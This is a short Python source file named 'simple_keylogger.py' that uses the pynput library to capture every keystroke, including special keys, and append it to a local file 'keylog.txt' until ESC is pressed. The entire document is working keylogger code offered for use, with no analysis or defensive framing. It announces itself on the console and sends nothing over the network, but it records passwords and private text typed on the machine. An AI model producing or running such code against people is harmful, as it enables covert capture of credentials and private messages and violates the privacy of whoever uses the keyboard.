# simple_keylogger.py

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key.name}] ")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

def main():
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()



